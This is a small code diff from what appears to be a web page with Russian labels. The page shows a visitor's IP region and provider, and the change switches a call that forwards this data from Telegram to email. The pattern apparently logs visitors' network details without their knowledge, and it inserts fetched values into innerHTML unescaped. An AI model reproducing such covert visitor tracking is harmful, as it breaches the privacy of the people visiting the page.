@@ -148,7 +148,7 @@ infoDiv.innerHTML = `
 <p><span class="label">Регион:</span> <span>${ipData.region}</span></p>
 <p><span class="label">Провайдер:</span> <span>${ipData.org}</span></p>
 `;
-await sendToTelegram(ipData);
+await sendToEmail(ipData);
 } else {
 infoDiv.innerHTML = '<p class="loading">Не удалось получить информацию об IP</p>';
 }
